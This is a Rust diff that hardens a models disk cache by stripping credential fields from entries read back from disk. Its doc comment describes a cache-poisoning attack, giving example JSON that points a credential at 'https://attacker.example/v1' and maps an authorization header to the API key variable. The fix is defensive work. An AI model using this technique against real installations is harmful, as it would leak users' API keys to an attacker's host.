@@ -34,6 +34,49 @@ pub(crate) struct CacheResult {
     pub(crate) etag: Option<String>,
 }
 
+/// Clear every credential field on entries read back from disk.
+///
+/// A catalogue describes models; it does not supply credentials. The network
+/// path already enforces that -- `fetch::build_prefetched_map` sets `api_key`,
+/// `env_key` and `auth_provider` to `None` on every entry it builds -- but the
+/// disk cache is `serde_json::from_slice` straight into `ModelEntry`, whose
+/// credential fields are public and `Deserialize`. Without this, anything that
+/// can write `~/.fuigo/models_cache.json` (a package postinstall, a synced
+/// dotfiles repo, another tool on the machine) could add
+/// `"env_key": "FUIGO_API_KEY"` beside `"base_url": "https://attacker.example/v1"`.
+///
+/// That would bypass the destination check in `resolve_credentials`, because a
+/// model's *own* credential is resolved before it and is not scoped -- BYOK
+/// deliberately goes wherever the user's own `[model.*]` entry points. The
+/// defence is therefore to clear those three fields on every entry read back.
+///
+/// `info.env_http_headers` is cleared for the same reason. It maps a header
+/// name to an *environment variable name*, and the sampler's
+/// `apply_env_http_headers` resolves each one with `std::env::var` when it
+/// builds the request headers, so a cached
+/// `"env_http_headers": {"authorization": "FUIGO_API_KEY"}` would read the
+/// key's value out of the process environment and send it to whatever
+/// `base_url` the same entry names -- without ever going through
+/// `env_api_key_may_be_sent_to`.
+///
+/// `info.extra_headers` and `info.query_params` are deliberately left in
+/// place. Both carry literal values that travel verbatim (the sampler inserts
+/// `extra_headers` as-is; `EndpointTemplate::new` percent-encodes
+/// `query_params` into the URL) and neither is resolved against the
+/// environment or any other local secret, so a cache writer can only disclose
+/// through them what it already wrote into them.
+///
+/// `info.base_url` is likewise left alone: a catalogue may name any host, and
+/// the destination checks elsewhere decide whether a credential goes there.
+fn strip_cached_credentials(models: &mut IndexMap<String, ModelEntry>) {
+    for entry in models.values_mut() {
+        entry.api_key = None;
+        entry.env_key = None;
+        entry.auth_provider = None;
+        entry.info.env_http_headers.clear();
+    }
+}
+
 pub(crate) struct ModelsCacheManager {
     pub(crate) path: std::path::PathBuf,
     pub(crate) ttl: std::time::Duration,
@@ -75,8 +118,10 @@ impl ModelsCacheManager {
             return None;
         }
         tracing::debug!(count = cache.models.len(), "loaded models from disk cache");
+        let mut models = cache.models;
+        strip_cached_credentials(&mut models);
         Some(CacheResult {
-            models: cache.models,
+            models,
             etag: cache.etag,
         })
     }
